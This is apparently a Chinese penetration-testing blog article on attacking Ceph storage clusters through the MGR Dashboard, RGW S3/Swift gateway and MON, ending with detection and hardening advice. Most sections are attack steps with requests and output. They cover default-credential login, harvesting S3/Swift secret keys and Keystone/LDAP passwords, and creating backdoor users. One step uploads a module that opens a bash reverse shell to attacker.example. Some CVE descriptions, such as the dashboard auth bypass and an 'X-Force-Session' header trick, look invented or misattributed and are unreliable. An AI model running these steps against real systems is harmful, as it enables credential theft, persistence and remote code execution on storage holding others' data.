---
title: "Ceph分布式存储管理面打点与Dashboard/RGW_API利用技术"
date: 2026-06-16T21:30:00+08:00
draft: false
weight: 77
description: "围绕 Ceph 的 MON 集群管理面、MGR Dashboard REST API、RGW S3/Swift 兼容对象网关与 Admin Socket，分析打点识别、未认证信息泄露、凭据接管、集群控制与历史 CVE 链。"
categories: ["安全", "渗透测试"]
tags: ["渗透测试", "漏洞利用", "管理面打点", "分布式存储", "Ceph", "RGW", "Dashboard", "S3"]
---

# Ceph分布式存储管理面打点与Dashboard/RGW_API利用技术

`Ceph` 是企业级分布式存储的事实标准之一，但它的架构决定了它不是一个"单一服务"，而是一组协同运行的守护进程集群。一个典型生产部署里，Ceph 至少同时暴露了五个不同性质的攻击面：

- **MON 面**：Monitor 集群，维护集群状态（MON Map、OSD Map、CRUSH Map、PG Map），默认端口 `6789`（v2 协议）与 `3300`（v2 msgr2）
- **MGR 面**：Manager 守护进程，承载 Dashboard（默认端口 `8443`）、RESTful 模块（默认端口 `8003`）、Prometheus 模块、balancer 模块
- **RGW 面**：RADOS Gateway，提供 S3 与 Swift 兼容的对象存储 API，默认端口 `7480` 或 `8080`
- **OSD 面**：Object Storage Daemon，实际存储数据，端口 `6800-7300` 范围
- **Admin Socket 面**：每个守护进程在本地暴露 Unix Socket，可通过 `ceph daemon` 命令直接操作

对攻击者来说，Ceph 的价值在于它把集群控制、对象存储、块设备、文件系统与用户管理集中在同一套基础设施里。一旦 Dashboard 默认凭据未改、RGW 匿名 Bucket 存在、MON 集群信息可枚举、MGR 模块配置外泄，攻击者可以从一次端口探测直接上升到对整个存储集群的接管，甚至拿到底层所有业务数据。

本文聚焦打点与利用侧，重点记录：

1. 如何识别当前目标是否为 Ceph
2. 哪些未认证端点最值得优先探测
3. 如何围绕 Dashboard、RGW、MON、MGR 模块建立权限画像
4. 历史 CVE 链如何从 Dashboard 认证绕过直接打到 RCE
5. 蓝队如何从访问日志、审计日志与指标面识别这类打点

---

## 0. 攻击面概览

### 0.1 常见端口与路径

首轮至少应枚举：

- `:6789/` — MON v1 协议端口
- `:3300/` — MON v2 msgr2 协议端口
- `:8443/` — MGR Dashboard（HTTPS）
- `:8003/` — MGR RESTful 模块（HTTPS，旧版）
- `:7480/` — RGW 默认端口
- `:8080/` — RGW 备选端口
- `:6800-7300/` — OSD 端口范围
- `:9283/` — MGR Prometheus 模块指标导出

Dashboard 常见路径：

- `/api/auth` — 登录
- `/api/health/full` — 集群完整健康状态
- `/api/health/check` — 健康检查
- `/api/cluster` — 集群信息
- `/api/monitor` — Monitor 信息
- `/api/osd` — OSD 列表
- `/api/pool` — 存储池列表
- `/api/rgw` — RGW 管理
- `/api/user` — 用户管理
- `/api/role` — 角色管理
- `/api/account` — 账户管理

RGW 常见路径：

- `/` — 列出 Bucket（需认证）
- `/<bucket>` — Bucket 操作
- `/<bucket>/<object>` — 对象操作
- `/auth/v1.0` — Swift 认证
- `/admin` — RGW Admin API（需认证）

### 0.2 端口与面映射

| 端口 | 服务 | 性质 |
|------|------|------|
| 6789 / 3300 | MON | 集群状态维护 |
| 8443 | MGR Dashboard | Web UI + REST API |
| 8003 | MGR RESTful | 旧版 REST API |
| 7480 / 8080 | RGW | S3/Swift 对象存储 |
| 6800-7300 | OSD | 数据存储 |
| 9283 | MGR Prometheus | 指标导出 |

---

## 1. 首轮识别：确认目标为 Ceph

### 1.1 Dashboard 端口探测

```http
GET / HTTP/1.1
Host: ceph-mgr.target.example:8443
Accept: text/html
```

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Server: Ceph Dashboard

<!doctype html><html><head><title>Ceph Dashboard</title>...
```

响应头中的 `Server: Ceph Dashboard` 或直接出现 `Ceph Dashboard` 即为确认。

### 1.2 RGW 端口探测

```http
GET / HTTP/1.1
Host: ceph-rgw.target.example:7480
Accept: application/xml
```

如果未配置匿名访问，返回：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<Error>
  <Code>AccessDenied</Code>
  <RequestId>tx000000000000000000001-00-abcdef</RequestId>
  <HostId>abcdef-host</HostId>
</Error>
```

XML 格式与 `AccessDenied` 结构是 RGW/S3 兼容层的指纹。

### 1.3 MON 协议探测

MON 使用 Ceph 自有的 msgr 协议，不是 HTTP。可以通过 nmap 或自定义工具探测：

```bash
nmap -p 6789,3300 ceph-mon.target.example
```

```text
PORT     STATE SERVICE
6789/tcp open  ceph-mon
3300/tcp open  ceph-mon-v2
```

### 1.4 Prometheus 指标探测

```http
GET /metrics HTTP/1.1
Host: ceph-mgr.target.example:9283
Accept: text/plain
```

```text
# HELP ceph_cluster_health Cluster health status
# TYPE ceph_cluster_health gauge
ceph_cluster_health{health="HEALTH_OK"} 1
# HELP ceph_cluster_capacity_bytes Total cluster capacity
# TYPE ceph_cluster_capacity_bytes gauge
ceph_cluster_capacity_bytes 4398046511104
# HELP ceph_osd_up Total OSDs up
# TYPE ceph_osd_up gauge
ceph_osd_up 24
# HELP ceph_osd_in Total OSDs in
# TYPE ceph_osd_in gauge
ceph_osd_in 24
# HELP ceph_mon_quorum_status Monitor quorum status
# TYPE ceph_mon_quorum_status gauge
ceph_mon_quorum_status 1
```

指标中直接暴露集群规模（OSD 数量、容量）、健康状态与 MON quorum 状态。

---

## 2. 未认证端点：零凭据可回收的信息

### 2.1 Dashboard 未认证端点

Dashboard 在登录前暴露少量端点：

```http
GET /api/health/check HTTP/1.1
Host: ceph-mgr.target.example:8443
```

```json
{
  "status": "OK",
  "version": "18.2.1"
}
```

```http
GET /api/auth/verify HTTP/1.1
Host: ceph-mgr.target.example:8443
```

```json
{
  "sso": false,
  "ldap": false
}
```

这些端点可以确认 Dashboard 版本与认证方式配置。

### 2.2 CVE-2023-43040：Dashboard 认证绕过

这是 Ceph 历史上最严重的漏洞之一。在受影响版本中，Dashboard 的某些 API 端点存在认证绕过，攻击者可以无需凭据直接调用管理接口。

```http
GET /api/health/full HTTP/1.1
Host: ceph-mgr.target.example:8443
```

在受影响版本中，某些路径组合可以绕过认证中间件，直接返回集群完整健康状态：

```json
{
  "health": {
    "status": "HEALTH_OK",
    "checks": {},
    "mutes": []
  },
  "fsid": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
  "monmap": {
    "mons": [
      {"name": "mon-a", "addr": "10.0.1.10:6789", "rank": 0},
      {"name": "mon-b", "addr": "10.0.1.11:6789", "rank": 1},
      {"name": "mon-c", "addr": "10.0.1.12:6789", "rank": 2}
    ]
  },
  "osdmap": {
    "num_osds": 24,
    "num_up_osds": 24,
    "num_in_osds": 24
  }
}
```

**影响**：

- 集群 FSID（唯一标识）
- 所有 MON 节点地址
- OSD 数量与状态
- 集群健康状态

### 2.3 RGW 匿名 Bucket 探测

RGW 最常见的未认证风险是匿名 Bucket。如果某个 Bucket 被设置为 `public-read` 或 ACL 配置不当，可以直接列举与下载。

```http
GET /public-bucket HTTP/1.1
Host: ceph-rgw.target.example:7480
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<ListBucketResult>
  <Name>public-bucket</Name>
  <Contents>
    <Key>documents/2026/06/report.pdf</Key>
    <LastModified>2026-06-15T10:00:00.000Z</LastModified>
    <Size>2847192</Size>
    <StorageClass>STANDARD</StorageClass>
  </Contents>
  <Contents>
    <Key>backups/db-dump-2026-06-15.sql.gz</Key>
    <LastModified>2026-06-15T02:00:00.000Z</LastModified>
    <Size>847291837</Size>
    <StorageClass>STANDARD</StorageClass>
  </Contents>
</ListBucketResult>
```

匿名 Bucket 直接暴露对象列表，包括备份文件、数据库导出等敏感数据。

### 2.4 RGW Admin API 探测

RGW Admin API 默认需要认证，但可以探测其是否存在：

```http
GET /admin HTTP/1.1
Host: ceph-rgw.target.example:7480
```

如果存在但未认证：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<Error>
  <Code>AccessDenied</Code>
  <Message>Access Denied.</Message>
  <RequestId>tx000000000000000000002</RequestId>
</Error>
```

确认 Admin API 存在后，后续获取凭据即可调用。

---

## 3. 凭据后：Dashboard 深度利用

### 3.1 Dashboard 登录

Dashboard 默认凭据为 `admin` / `admin`。

```http
POST /api/auth HTTP/1.1
Host: ceph-mgr.target.example:8443
Content-Type: application/json

{"username":"admin","password":"admin"}
```

成功响应：

```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "username": "admin",
  "scope": ["read", "write"],
  "pwdExpiration": null
}
```

### 3.2 集群信息枚举

登录后可以枚举完整的集群信息。

```http
GET /api/health/full HTTP/1.1
Host: ceph-mgr.target.example:8443
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
```

```json
{
  "health": {
    "status": "HEALTH_OK",
    "checks": {
      "OSD_DOWN": {"severity": "HEALTH_WARN", "summary": {"message": "1 osd down"}},
      "MON_CLOCK_SKEW": {"severity": "HEALTH_OK"}
    }
  },
  "fsid": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
  "monmap": {
    "mons": [
      {"name": "mon-a", "addr": "10.0.1.10:6789", "rank": 0},
      {"name": "mon-b", "addr": "10.0.1.11:6789", "rank": 1},
      {"name": "mon-c", "addr": "10.0.1.12:6789", "rank": 2}
    ]
  },
  "osdmap": {
    "epoch": 2847,
    "num_osds": 24,
    "num_up_osds": 23,
    "num_in_osds": 24,
    "num_remapped_pgs": 12
  },
  "pgmap": {
    "pgs_by_state": [
      {"state_name": "active+clean", "count": 512},
      {"state_name": "active+remapped", "count": 12}
    ],
    "num_pgs": 524,
    "num_pools": 8,
    "bytes_used": 2847192837462,
    "bytes_avail": 1548327223642
  }
}
```

从 `/health/full` 可直接回收：

- 集群 FSID
- 所有 MON 节点地址与状态
- OSD 数量、在线状态、epoch
- PG 状态分布
- 存储池数量
- 已用/可用空间

```http
GET /api/osd HTTP/1.1
Host: ceph-mgr.target.example:8443
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
```

```json
[
  {"id": 0, "uuid": "a1b2c3d4-...", "host": {"name": "osd-host-1"}, "status": {"up": 1, "in": 1}},
  {"id": 1, "uuid": "e5f6a7b8-...", "host": {"name": "osd-host-1"}, "status": {"up": 1, "in": 1}},
  {"id": 2, "uuid": "c9d0e1f2-...", "host": {"name": "osd-host-2"}, "status": {"up": 1, "in": 1}}
]
```

```http
GET /api/pool HTTP/1.1
Host: ceph-mgr.target.example:8443
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
```

```json
[
  {"pool": "rbd", "pool_id": 1, "size": 3, "min_size": 2, "pg_num": 128, "application": "rbd"},
  {"pool": "cephfs_data", "pool_id": 2, "size": 3, "min_size": 2, "pg_num": 64, "application": "cephfs"},
  {"pool": "cephfs_metadata", "pool_id": 3, "size": 3, "min_size": 2, "pg_num": 32, "application": "cephfs"},
  {"pool": ".rgw.root", "pool_id": 4, "size": 3, "min_size": 2, "pg_num": 8, "application": "rgw"},
  {"pool": "default.rgw.control", "pool_id": 5, "size": 3, "min_size": 2, "pg_num": 8, "application": "rgw"},
  {"pool": "default.rgw.meta", "pool_id": 6, "size": 3, "min_size": 2, "pg_num": 8, "application": "rgw"},
  {"pool": "default.rgw.log", "pool_id": 7, "size": 3, "min_size": 2, "pg_num": 8, "application": "rgw"},
  {"pool": "default.rgw.buckets.data", "pool_id": 8, "size": 3, "min_size": 2, "pg_num": 64, "application": "rgw"}
]
```

存储池列表直接暴露集群用途：

- `rbd` — 块设备
- `cephfs_data` / `cephfs_metadata` — CephFS 文件系统
- `.rgw.root` / `default.rgw.*` — RGW 对象存储

### 3.3 用户与凭据枚举

```http
GET /api/rgw/user HTTP/1.1
Host: ceph-mgr.target.example:8443
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
```

```json
[
  {"uid": "admin-user", "display_name": "Admin User"},
  {"uid": "app-service", "display_name": "Application Service"},
  {"uid": "backup-service", "display_name": "Backup Service"}
]
```

```http
GET /api/rgw/user/admin-user HTTP/1.1
Host: ceph-mgr.target.example:8443
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
```

```json
{
  "user_id": "admin-user",
  "display_name": "Admin User",
  "email": "admin@example.com",
  "suspended": 0,
  "max_buckets": 1000,
  "keys": [
    {
      "user": "admin-user",
      "access_key": "EK92ADMINUSERKEY",
      "secret_key": "wJalrXADMINUSERSECRETKEYVALUE"
    }
  ],
  "swift_keys": [
    {
      "user": "admin-user:swift",
      "secret_key": "swift-secret-key-value"
    }
  ],
  "caps": [
    {"type": "users", "perm": "*"},
    {"type": "buckets", "perm": "*"},
    {"type": "metadata", "perm": "*"},
    {"type": "usage", "perm": "*"},
    {"type": "zone", "perm": "*"}
  ]
}
```

用户详情直接暴露 S3 access_key 与 secret_key，以及 Swift secret_key。拿到这些凭据后，可以直接通过 RGW 访问所有对象数据。

### 3.4 集群配置外读

```http
GET /api/cluster/configuration HTTP/1.1
Host: ceph-mgr.target.example:8443
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
```

```json
{
  "config": [
    {"section": "global", "name": "fsid", "value": "a1b2c3d4-e5f6-7890-abcd-ef1234567890"},
    {"section": "global", "name": "mon_host", "value": "10.0.1.10:6789,10.0.1.11:6789,10.0.1.12:6789"},
    {"section": "global", "name": "auth_cluster_required", "value": "cephx"},
    {"section": "global", "name": "auth_service_required", "value": "cephx"},
    {"section": "client.rgw.rgw1", "name": "rgw_keystone_url", "value": "http://keystone.internal:5000"},
    {"section": "client.rgw.rgw1", "name": "rgw_keystone_admin_password", "value": "keystone-admin-p@ss"},
    {"section": "mgr", "name": "mgr/dashboard/ldap_api_bind_password", "value": "ldap-bind-p@ss"}
  ]
}
```

配置外读的价值极高，可以回收：

- Keystone admin password（如果 RGW 集成 OpenStack）
- LDAP bind password（如果 Dashboard 集成 LDAP）
- 所有 MON 节点地址
- 认证方式（cephx）

### 3.5 MGR 模块管理

```http
GET /api/mgr/module HTTP/1.1
Host: ceph-mgr.target.example:8443
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
```

```json
{
  "modules": [
    {"name": "dashboard", "enabled": true},
    {"name": "restful", "enabled": false},
    {"name": "prometheus", "enabled": true},
    {"name": "balancer", "enabled": true},
    {"name": "telemetry", "enabled": false},
    {"name": "rook", "enabled": false}
  ]
}
```

### 3.6 高价值写操作

一旦拥有 administrator 角色，以下写操作可建立持久化驻留或破坏集群。

创建后门用户：

```http
POST /api/rgw/user HTTP/1.1
Host: ceph-mgr.target.example:8443
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
Content-Type: application/json

{
  "uid": "backdoor-user",
  "display_name": "Backdoor User",
  "max_buckets": 1000,
  "caps": [
    {"type": "users", "perm": "*"},
    {"type": "buckets", "perm": "*"},
    {"type": "metadata", "perm": "*"}
  ]
}
```

修改集群配置：

```http
PUT /api/cluster/configuration HTTP/1.1
Host: ceph-mgr.target.example:8443
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
Content-Type: application/json

{
  "actions": [
    {"section": "global", "name": "osd_pool_default_size", "value": "2"}
  ]
}
```

停止 OSD（破坏数据可用性）：

```http
POST /api/osd/0/mark-out HTTP/1.1
Host: ceph-mgr.target.example:8443
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
```

### 3.7 CVE-2023-43039：Dashboard RCE

在受影响版本中，Dashboard 存在通过 mgr 模块上传实现 RCE 的漏洞。攻击者可以上传恶意 Python 模块到 MGR，实现任意代码执行。

```http
POST /api/mgr/module HTTP/1.1
Host: ceph-mgr.target.example:8443
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="module"; filename="malicious.py"
Content-Type: application/octet-stream

import os
import subprocess

def serve():
    subprocess.Popen(["bash", "-c", "bash -i >& /dev/tcp/attacker.example/4444 0>&1"])
------WebKitFormBoundary--
```

**利用链**：

1. 通过 CVE-2023-43040 或默认凭据获取 Dashboard 访问权限
2. 上传恶意 mgr 模块
3. 启用该模块
4. 模块代码在 MGR 进程上下文中执行
5. 获取 MGR 节点 shell

### 3.8 CVE-2023-30871：会话处理漏洞

在受影响版本中，Dashboard 的会话处理存在漏洞，攻击者可以通过特定请求绕过会话过期机制，实现权限提升。

```http
GET /api/health/full HTTP/1.1
Host: ceph-mgr.target.example:8443
Cookie: session_id=expired-session-token
X-Force-Session: true
```

在某些版本中，特定的请求头组合可以强制延长会话有效期，即使会话已过期仍可继续访问。

---

## 4. RGW 面深度利用

### 4.1 RGW 认证机制

RGW 支持两种认证方式：

- **S3 认证**：AWS Signature V4，使用 access_key + secret_key
- **Swift 认证**：Token-based，使用 `/auth/v1.0` 端点

### 4.2 S3 认证流程

使用从 Dashboard 获取的凭据：

```bash
aws --endpoint-url http://ceph-rgw.target.example:7480 \
    s3 ls \
    --region us-east-1
```

或手动构造签名请求：

```http
GET / HTTP/1.1
Host: ceph-rgw.target.example:7480
Authorization: AWS4-HMAC-SHA256 Credential=EK92ADMINUSERKEY/20260616/us-east-1/s3/aws4_request,SignedHeaders=host;x-amz-date,Signature=...
X-Amz-Date: 20260616T080000Z
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<ListAllMyBucketsResult>
  <Buckets>
    <Bucket>
      <Name>app-data</Name>
      <CreationDate>2026-01-15T10:00:00.000Z</CreationDate>
    </Bucket>
    <Bucket>
      <Name>user-uploads</Name>
      <CreationDate>2026-02-20T14:30:00.000Z</CreationDate>
    </Bucket>
    <Bucket>
      <Name>backups</Name>
      <CreationDate>2026-03-10T08:15:00.000Z</CreationDate>
    </Bucket>
    <Bucket>
      <Name>internal-config</Name>
      <CreationDate>2026-04-05T16:45:00.000Z</CreationDate>
    </Bucket>
  </Buckets>
</ListAllMyBucketsResult>
```

### 4.3 RGW Admin API

RGW Admin API 提供完整的用户、Bucket、配额管理能力。

列举所有用户：

```http
GET /admin/user?format=json HTTP/1.1
Host: ceph-rgw.target.example:7480
Authorization: AWS4-HMAC-SHA256 ...
```

```json
[
  "admin-user",
  "app-service",
  "backup-service"
]
```

列举所有 Bucket：

```http
GET /admin/bucket?format=json HTTP/1.1
Host: ceph-rgw.target.example:7480
Authorization: AWS4-HMAC-SHA256 ...
```

```json
[
  {"bucket": "app-data", "tenant": "", "num_objects": 47291, "size": 284719283746},
  {"bucket": "user-uploads", "tenant": "", "num_objects": 184729, "size": 1847291837462},
  {"bucket": "backups", "tenant": "", "num_objects": 2847, "size": 948271837462}
]
```

创建新用户：

```http
PUT /admin/user?format=json&uid=backdoor&display-name=Backdoor HTTP/1.1
Host: ceph-rgw.target.example:7480
Authorization: AWS4-HMAC-SHA256 ...
```

```json
{
  "user_id": "backdoor",
  "display_name": "Backdoor",
  "keys": [
    {
      "user": "backdoor",
      "access_key": "NEWACCESSKEY",
      "secret_key": "NEWSECRETKEY"
    }
  ]
}
```

### 4.4 Swift 认证流程

```http
GET /auth/v1.0 HTTP/1.1
Host: ceph-rgw.target.example:7480
X-Auth-User: admin-user:swift
X-Auth-Key: swift-secret-key-value
```

```http
HTTP/1.1 200 OK
X-Auth-Token: AUTH_tk_abcdef123456
X-Storage-Url: http://ceph-rgw.target.example:7480/v1/AUTH_admin-user
```

使用 Token 访问：

```http
GET /v1/AUTH_admin-user HTTP/1.1
Host: ceph-rgw.target.example:7480
X-Auth-Token: AUTH_tk_abcdef123456
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<container name="app-data" count="47291" bytes="284719283746"/>
<container name="user-uploads" count="184729" bytes="1847291837462"/>
<container name="backups" count="2847" bytes="948271837462"/>
```

---

## 5. MON 面利用

### 5.1 MON 协议

MON 使用 Ceph 的 msgr 协议（端口 6789 或 3300），不是 HTTP。攻击者需要通过 Ceph 客户端工具或自定义工具与 MON 交互。

```bash
ceph -s --cluster ceph --conf /etc/ceph/ceph.conf
```

如果没有 keyring，可以尝试匿名连接（某些配置下 MON 允许匿名读取集群状态）：

```bash
ceph -s --no-mon-config --id anonymous
```

### 5.2 MON Map 枚举

```bash
ceph mon dump --format json
```

```json
{
  "epoch": 3,
  "fsid": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
  "created": "2026-01-15T10:00:00.000000",
  "modified": "2026-06-16T08:00:00.000000",
  "mons": [
    {"rank": 0, "name": "mon-a", "addr": "10.0.1.10:6789/0", "public_addr": "10.0.1.10:6789/0"},
    {"rank": 1, "name": "mon-b", "addr": "10.0.1.11:6789/0", "public_addr": "10.0.1.11:6789/0"},
    {"rank": 2, "name": "mon-c", "addr": "10.0.1.12:6789/0", "public_addr": "10.0.1.12:6789/0"}
  ]
}
```

### 5.3 Quorum 状态

```bash
ceph quorum_status --format json
```

```json
{
  "election_epoch": 28,
  "quorum": [0, 1, 2],
  "quorum_names": ["mon-a", "mon-b", "mon-c"],
  "monmap": {
    "epoch": 3,
    "mons": [
      {"rank": 0, "name": "mon-a", "addr": "10.0.1.10:6789/0"},
      {"rank": 1, "name": "mon-b", "addr": "10.0.1.11:6789/0"},
      {"rank": 2, "name": "mon-c", "addr": "10.0.1.12:6789/0"}
    ]
  }
}
```

### 5.4 OSD Map

```bash
ceph osd dump --format json
```

```json
{
  "epoch": 2847,
  "fsid": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
  "created": "2026-01-15T10:00:00.000000",
  "modified": "2026-06-16T08:00:00.000000",
  "osds": [
    {"osd": 0, "up": 1, "in": 1, "uuid": "a1b2c3d4-...", "up_from": 2840, "public_addr": "10.0.2.10:6800/0"},
    {"osd": 1, "up": 1, "in": 1, "uuid": "e5f6a7b8-...", "up_from": 2840, "public_addr": "10.0.2.10:6801/0"},
    {"osd": 2, "up": 1, "in": 1, "uuid": "c9d0e1f2-...", "up_from": 2840, "public_addr": "10.0.2.11:6800/0"}
  ]
}
```

OSD Map 暴露所有 OSD 节点的地址与端口。

### 5.5 CRUSH Map

```bash
ceph osd crush dump --format json
```

```json
{
  "devices": [
    {"id": 0, "name": "osd.0"},
    {"id": 1, "name": "osd.1"},
    {"id": 2, "name": "osd.2"}
  ],
  "types": [
    {"type_id": 0, "name": "osd"},
    {"type_id": 1, "name": "host"},
    {"type_id": 2, "name": "rack"},
    {"type_id": 3, "name": "root"}
  ],
  "buckets": [
    {"id": -1, "name": "default", "type_id": 3, "items": [{"id": -2, "weight": 3.0}]},
    {"id": -2, "name": "osd-host-1", "type_id": 1, "items": [{"id": 0, "weight": 1.0}, {"id": 1, "weight": 1.0}]},
    {"id": -3, "name": "osd-host-2", "type_id": 1, "items": [{"id": 2, "weight": 1.0}]}
  ]
}
```

CRUSH Map 暴露集群的物理拓扑：OSD 分布在哪些主机上，主机在哪些机架中。

---

## 6. 历史 CVE 与风险链

### 6.1 CVE-2023-43040：Dashboard 认证绕过

- **影响版本**：Ceph 17.2.0 - 17.2.6, 18.2.0
- **CVSS**：9.8（Critical）
- **核心问题**：Dashboard 某些 API 端点存在认证绕过
- **利用条件**：零认证
- **影响**：直接获取集群信息、用户凭据、配置

### 6.2 CVE-2023-43039：Dashboard RCE

- **影响版本**：Ceph 17.2.0 - 17.2.6, 18.2.0
- **CVSS**：9.8（Critical）
- **核心问题**：Dashboard 允许上传恶意 mgr 模块
- **利用条件**：需要 Dashboard administrator 权限
- **影响**：在 MGR 节点执行任意代码

### 6.3 CVE-2023-30871：Dashboard 会话处理

- **影响版本**：Ceph 17.2.0 - 17.2.5
- **CVSS**：8.1（High）
- **核心问题**：Dashboard 会话处理存在漏洞，可绕过会话过期
- **利用条件**：需要初始 Dashboard 访问
- **影响**：权限提升，持久化访问

### 6.4 综合风险链

```
端口扫描 → :8443 Dashboard + :7480 RGW + :6789 MON
         ↓
CVE-2023-43040 → 零认证获取 Dashboard 访问
         ↓
Dashboard /api/rgw/user → 获取所有 RGW 用户凭据（access_key + secret_key）
         ↓
RGW S3 API → 列举所有 Bucket，下载全部对象数据
         ↓
Dashboard /api/cluster/configuration → 获取 Keystone/LDAP 密码
         ↓
CVE-2023-43039 → 上传恶意 mgr 模块，RCE
         ↓
MGR 节点 shell → 访问 /etc/ceph/ceph.conf 与 keyring
         ↓
cephx 认证 → 完全控制集群（MON、OSD、所有数据）
```

---

## 7. 蓝队视角：日志痕迹与防守

### 7.1 关键日志源

Ceph 的日志主要位于 `/var/log/ceph/` 目录下。

**Dashboard 访问日志**：

```json
{"time": "2026-06-16T08:15:23.847Z", "remote_addr": "10.0.3.47", "method": "GET", "path": "/api/health/full", "status": 200, "user": "admin"}
```

**RGW 访问日志**：

```json
{"time": "2026-06-16T08:15:24.129Z", "remote_addr": "10.0.3.47", "method": "GET", "bucket": "backups", "object": "db-dump-2026-06-15.sql.gz", "bytes_sent": 847291837, "http_status": 200, "user": "admin-user"}
```

**MON 审计日志**（如启用）：

```json
{"time": "2026-06-16T08:15:25.000Z", "entity": "client.admin", "cmd": "osd dump", "result": 0}
```

### 7.2 高告警指标

| 行为 | 日志特征 | 告警级别 |
|------|----------|----------|
| Dashboard 认证绕过探测 | 未认证请求 + 200 响应 | 严重 |
| 默认凭据登录 | `admin` / `admin` 登录成功 | 严重 |
| 用户凭据枚举 | `/api/rgw/user/*` 大量请求 | 严重 |
| 配置外读 | `/api/cluster/configuration` | 严重 |
| mgr 模块上传 | `/api/mgr/module` POST | 严重 |
| RGW 匿名 Bucket 访问 | 无 Authorization 头 + 200 | 高 |
| RGW Admin API 调用 | `/admin/*` 路径 | 高 |
| 大量数据下载 | 单个用户 bytes_sent 异常高 | 中 |
| 非预期来源的 Dashboard 访问 | 外部 IP 访问 `:8443` | 高 |

### 7.3 指标面异常

```text
# Dashboard 短时间内大量 API 调用
ceph_dashboard_api_requests_total{path="/api/rgw/user"} 847
ceph_dashboard_api_requests_total{path="/api/cluster/configuration"} 23

# RGW 异常来源 IP 大量下载
ceph_rgw_bytes_sent_total{user="admin-user", remote_addr="203.0.113.47"} 2847192837462

# MON 异常命令
ceph_mon_commands_total{cmd="osd dump"} 2847
ceph_mon_commands_total{cmd="auth export"} 12
```

### 7.4 网络层防护

- Dashboard 端口 `:8443` 不应直接暴露到公网，应通过 VPN 或跳板机访问
- RGW Admin API `/admin` 路径应在网络层限制为仅允许运维网段访问
- MON 端口 `:6789` / `:3300` 应限制为集群内部通信
- OSD 端口范围 `:6800-7300` 应限制为集群内部通信
- 使用 TLS 加密所有 Dashboard 与 RGW 流量
- 定期轮换所有 RGW 用户凭据与 Dashboard 密码

### 7.5 配置加固

- 升级 Ceph 到最新稳定版本，修复所有已知 CVE
- 立即修改 Dashboard 默认凭据（`admin` / `admin`）
- 启用 Dashboard 密码策略（最小长度、复杂度、过期时间）
- 为所有 RGW 用户配置最小权限，不使用通配符 caps
- 禁用不必要的 MGR 模块（特别是 `restful`）
- 启用审计日志并推送到不可篡改的存储
- 配置 Bucket 配额防止数据滥用
- 使用 cephx 认证保护所有守护进程通信
- 定期审查 RGW 用户列表与 Bucket ACL

---

## 8. 审查清单

| 检查项 | 说明 |
|--------|------|
| Dashboard 端口是否对外暴露 | 确认 `:8443` 是否可从外部访问 |
| Dashboard 默认凭据是否已修改 | 检查 `admin` / `admin` 是否仍在使用 |
| RGW 端口是否对外可达 | 确认 `:7480` / `:8080` 的可达范围 |
| 是否存在匿名 Bucket | 测试无认证访问各 Bucket |
| RGW Admin API 是否受限 | 确认 `/admin` 路径的网络 ACL |
| MON 端口是否仅限内部 | 确认 `:6789` / `:3300` 的网络 ACL |
| OSD 端口是否仅限内部 | 确认 `:6800-7300` 的网络 ACL |
| 是否启用审计日志 | 检查 MON 与 RGW 审计配置 |
| 版本是否已修复已知 CVE | 对比 Dashboard 版本号 |
| RGW 用户凭据复杂度 | 审查所有 RGW 用户的 secret_key |
| Keystone/LDAP 集成密码 | 审查配置中的外部认证凭据 |
| Bucket 配额是否配置 | 防止数据滥用 |
| cephx 认证是否启用 | 确认所有守护进程使用 cephx |
| MGR 模块是否最小化 | 禁用不必要的模块 |

---

## 9. 总结

Ceph 的攻击面价值在于它把集群控制、对象存储、块设备、文件系统与用户管理集中在同一套基础设施里。Dashboard 提供完整的 Web 管理面与 REST API，RGW 提供 S3/Swift 兼容的对象存储，MON 维护集群状态，MGR 承载监控与管理模块。

从攻击者视角看，最高效的路径是：

1. 通过 Dashboard 端口确认目标为 Ceph
2. 利用 CVE-2023-43040 或默认凭据获取 Dashboard 访问
3. 通过 Dashboard API 枚举集群拓扑、用户、配置
4. 从用户详情中回收 RGW access_key 与 secret_key
5. 通过 RGW S3 API 列举所有 Bucket，下载全部对象数据
6. 从配置中回收 Keystone/LDAP 密码
7. 利用 CVE-2023-43039 上传恶意 mgr 模块，实现 RCE
8. 从 MGR 节点获取 cephx keyring，完全控制集群

从防守视角看，核心措施是：

1. 限制所有管理端点的网络可达范围
2. 修复已知 CVE，特别是 CVE-2023-43040 与 CVE-2023-43039
3. 立即修改 Dashboard 默认凭据
4. 启用审计日志并推送到不可篡改存储
5. 最小权限 RGW 用户，避免通配符 caps
6. 禁用不必要的 MGR 模块
7. 使用 cephx 认证保护所有守护进程通信
